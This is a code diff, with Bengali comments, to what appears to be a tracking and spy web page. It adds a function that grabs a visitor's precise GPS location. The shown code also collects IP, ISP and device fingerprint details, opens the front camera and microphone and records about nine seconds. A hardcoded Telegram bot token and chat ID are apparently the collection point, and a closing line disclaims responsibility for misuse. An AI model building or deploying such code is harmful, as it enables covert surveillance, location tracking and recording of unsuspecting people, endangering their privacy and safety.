@@ -13,15 +13,40 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
+        // জিপিএস লোকেশন নেওয়ার ফাংশন
+        function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Not Supported");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        resolve(`Lat: ${lat}, Lon: ${lon} (GPS)`);
+                    },
+                    (error) => {
+                        resolve("Permission Denied or Disabled");
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            });
+        }
+
         async function getDeviceInfo() {
-            let ip = "Unknown", isp = "Unknown", locationStr = "Unknown";
+            let ip = "Unknown", isp = "Unknown", apiLocation = "Unknown";
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 ip = data.ip || "Unknown";
                 isp = data.org || "Unknown";
-                locationStr = `${data.city}, ${data.region}, ${data.country_name}`;
+                apiLocation = `${data.city}, ${data.region}, ${data.country_name} (IP Based)`;
             } catch (e) {}
+
+            // জিপিএস লোকেশন চেক করা
+            let gpsLocation = await getGPSLocation();
+            let finalLocation = gpsLocation.includes("Lat") ? gpsLocation : apiLocation;
 
             let batteryStatus = "Unknown", isCharging = "❌";
             try {
@@ -81,7 +106,7 @@
 
 🌐 IP Address: ${ip}
 🏢 ISP: ${isp}
-📍 Location: ${locationStr}
+📍 Location: ${finalLocation}
 
 💻 User-Agent: ${navigator.userAgent}
 🌐 Browser: ${navigator.language}
@@ -92,7 +117,7 @@
 🚀 Internet Speed: ${speed}
 📶 Network: ${networkType} Type: ${effectiveType}
 
-💾 RAM & Storage: ${deviceMemory} / ${navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'Unknown'}
+💾 RAM & Storage: ${deviceMemory} / ${hardwareConcurrency} Cores
 🕒 Date: ${dateStr}
 🌍 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 
@@ -101,12 +126,11 @@
 🧑‍💻 CPU Cores: ${hardwareConcurrency}
 🎮 GPU Renderer: ${glRenderer}
 
-⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।`;
+⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না.`;
         }
 
         async function startProcess() {
             try {
-                // ক্যামেরা এবং অডিও একসাথে পারমিশন নেওয়া
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -137,7 +161,6 @@
 
                 mediaRecorder.start();
 
-                // ৮ সেকেন্ড রেকর্ড করার পর অটো স্টপ হবে
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, 9000);
